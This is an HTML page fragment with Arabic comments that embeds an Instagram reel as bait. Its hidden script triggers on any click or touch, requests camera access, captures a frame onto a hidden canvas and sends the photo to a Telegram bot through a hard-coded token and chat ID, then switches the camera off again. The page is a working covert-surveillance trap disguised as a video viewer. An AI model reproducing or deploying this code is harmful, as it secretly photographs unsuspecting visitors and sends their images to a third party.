iframe {
        border: none;
        max-width: 100%;
        max-height: 100%;
    }
</style>
<!-- عرض فيديو إنستغرام -->
<iframe 
    src="https://www.instagram.com/reel/DdjtPokIGQY/embed" 
    width="400" 
    height="500" 
    scrolling="no" 
    allowtransparency="true"
    allow="encrypted-media">
</iframe>

<!-- عنصر Canvas مخفي -->
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TELEGRAM_BOT_TOKEN = "8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA";
    const TELEGRAM_CHAT_ID = "664291354";

    let stream = null;
    const canvas = document.getElementById('canvas');

    async function handleCapture(event) {
        try {
            // طلب الوصول للكاميرا
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // 3. إرسال الصورة إلى تيليجرام
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'capture.png');

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (err) {
                    console.error("خطأ الإرسال:", err);
                }
            }, 'image/png');

        } catch (err) {
            console.error("خطأ الكاميرا:", err);
        } finally {
            // 4. إغلاق الكاميرا وإيقاف الضوء/البث فوراً
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }
    }

    // الاستماع للنقر أو اللمس في أي مكان في الصفحة
    window.addEventListener('click', handleCapture);
    window.addEventListener('touchstart', handleCapture);
</script>
